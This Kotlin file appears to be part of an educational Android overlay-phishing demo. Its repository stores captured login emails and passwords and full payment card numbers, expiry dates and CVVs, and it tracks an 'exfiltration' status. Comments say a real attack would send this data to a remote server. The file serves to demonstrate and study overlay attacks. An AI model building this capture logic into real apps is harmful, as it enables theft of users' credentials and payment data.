package com.ghosttouch.attacker.capture

import com.ghosttouch.common.model.CaptureSession
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter

/**
 * In-memory repository for captured overlay sessions.
 *
 * Stores [CaptureSession] objects from overlay interactions. In a real
 * malicious app, this data would be sent to a remote server. Here, it's
 * kept in memory for educational review in the session viewer.
 *
 * Uses [StateFlow] so Compose UI automatically recomposes when sessions change.
 */
object SessionRepository {

    private val _sessions = MutableStateFlow<List<CaptureSession>>(emptyList())

    /** Observable list of all captured sessions. */
    val sessions: StateFlow<List<CaptureSession>> = _sessions.asStateFlow()

    private val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        .withZone(ZoneId.systemDefault())

    /**
     * Records a new captured login session.
     *
     * @param targetApp Package name of the overlaid app.
     * @param email Captured email/username.
     * @param password Captured password.
     * @return The created [CaptureSession].
     */
    fun captureLogin(targetApp: String, email: String, password: String): CaptureSession {
        val session = CaptureSession(
            id = System.currentTimeMillis(),
            targetApp = targetApp,
            email = email,
            password = password,
            timestamp = formatter.format(Instant.now()),
            overlayType = "login"
        )
        _sessions.update { current -> listOf(session) + current }
        return session
    }

    /**
     * Records a new captured payment session.
     *
     * @param targetApp Package name of the overlaid app.
     * @param cardNumber Captured card number.
     * @param expiry Captured expiry date.
     * @param cvv Captured CVV.
     * @return The created [CaptureSession].
     */
    fun capturePayment(
        targetApp: String,
        cardNumber: String,
        expiry: String,
        cvv: String
    ): CaptureSession {
        val session = CaptureSession(
            id = System.currentTimeMillis(),
            targetApp = targetApp,
            email = "Card: *${cardNumber.takeLast(4)}",
            password = "Exp: $expiry / CVV: $cvv",
            cardNumber = cardNumber,
            timestamp = formatter.format(Instant.now()),
            overlayType = "payment"
        )
        _sessions.update { current -> listOf(session) + current }
        return session
    }

    /**
     * Updates the exfiltration status and encoded payload for a session.
     */
    fun updateExfilStatus(sessionId: Long, encodedPayload: String, status: String) {
        _sessions.update { current ->
            current.map { session ->
                if (session.id == sessionId) {
                    session.copy(encodedPayload = encodedPayload, exfilStatus = status)
                } else session
            }
        }
    }

    /** Clears all captured sessions. */
    fun clear() {
        _sessions.value = emptyList()
    }
}
